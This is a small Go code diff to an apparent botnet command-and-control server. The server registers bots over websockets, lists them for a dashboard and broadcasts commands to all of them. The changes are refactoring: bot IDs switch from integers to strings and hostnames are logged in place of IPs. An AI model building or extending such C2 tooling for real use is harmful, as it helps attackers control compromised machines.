@@ -7,7 +7,6 @@ import (
 	"io"
 	"log"
 	"net/http"
-	"strconv"
 	"time"
 
 	"github.com/coder/websocket"
@@ -36,7 +35,7 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 	c.registerBot(b.ID, &b)
 	b.mu.Unlock()
 
-	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)
+	fmt.Print(b.ID, b.HostName, b.OS, b.LastSeen)
 
 	go c.listentoBot(&b)
 
@@ -75,7 +74,7 @@ func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
 	json.Unmarshal(body, &cmd)
 	// fmt.Println(cmd)
 
-	if strconv.Itoa(cmd.BotID) == "*" {
+	if cmd.BotID == "*" {
 		for _, v := range c.bots {
 			if err = wsjson.Write(context.Background(), v.con, cmd.CmdType); err != nil {
 				log.Println(err)
@@ -106,7 +105,7 @@ func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
 	log.Println("List of bots send to dashboard.")
 }
 
-func (c *c2) DisconnectBot(botID int) bool {
+func (c *c2) DisconnectBot(botID string) bool {
 	exist := true
 	bot := c.getBot(botID)
 
